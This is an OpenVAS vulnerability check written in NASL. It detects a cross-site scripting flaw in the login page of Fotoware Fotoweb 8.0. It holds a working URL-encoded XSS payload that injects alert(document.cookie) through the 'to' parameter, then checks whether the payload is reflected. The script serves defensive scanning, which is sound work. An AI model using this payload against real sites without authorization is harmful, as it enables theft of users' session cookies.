###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fotoware_fotoweb_xss_vuln.nasl 11922 2018-10-16 10:24:25Z asteins $
#
# Fotoware Fotoweb Cross-site Scripting Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:fotoware:fotoweb";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808279");
  script_version("$Revision: 11922 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-16 12:24:25 +0200 (Tue, 16 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-08-04 13:00:10 +0530 (Thu, 04 Aug 2016)");
  script_name("Fotoware Fotoweb Cross-site Scripting Vulnerability");

  script_tag(name:"summary", value:"The host is running Fotoware Fotoweb and is
  prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether its able to read cookie value or not.");

  script_tag(name:"insight", value:"The flaw exists due to an insufficient
  sanitization of 'to' parameter in 'login' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to create a specially crafted request that would execute arbitrary
  script code in a user's browser session within the trust relationship between
  their browser and the server.");

  script_tag(name:"affected", value:"Fotoware Fotoweb version 8.0.");

  script_tag(name:"solution", value:"Upgrade to FotoWeb 8 Feature Release 8 or
  later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/138106/Fotoware-Fotoweb-8.0-Cross-Site-Scripting.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_fotoware_fotoweb_detect.nasl");
  script_mandatory_keys("Fotoware/Fotoweb/Installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://fotoware.com");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if(!fbPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:fbPort)){
  exit(0);
}

url = dir + '/views/login?to=/fotoweb/%22;}%20else%20{%20alert%28document.cookie%29;%20}' +
            '%20if%20%28inIframe%28%29%29%20{%20var%20relleno=%22';

if(http_vuln_check(port:fbPort, url:url, check_header:TRUE,
                   pattern:"alert\(document.cookie\);",
                   extra_check:make_list("Log in to FotoWeb", ">Password")))
{
  report = report_vuln_url(port:fbPort, url:url);
  security_message(port:fbPort, data:report);
  exit(0);
}

exit(99);